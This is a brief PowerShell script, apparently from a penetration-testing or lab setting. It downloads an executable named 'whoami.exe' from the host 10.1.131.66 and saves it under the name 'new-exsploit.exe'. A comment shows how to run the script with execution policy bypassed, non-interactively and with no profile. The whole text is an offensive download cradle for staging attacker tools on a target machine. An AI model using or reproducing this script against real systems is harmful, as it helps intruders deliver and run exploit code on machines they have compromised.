$strongeDir = $pwd
$webclient = New-Object System.Net.WebClient
$url = "http://10.1.131.66/whoami.exe"
$file = "new-exsploit.exe"
$webclient.DownloadFile($url, $file)


# powershell.exe -ExecutionPolicy ByPass -NoLogo -NonInteractive -NoProfile -File wget.ps1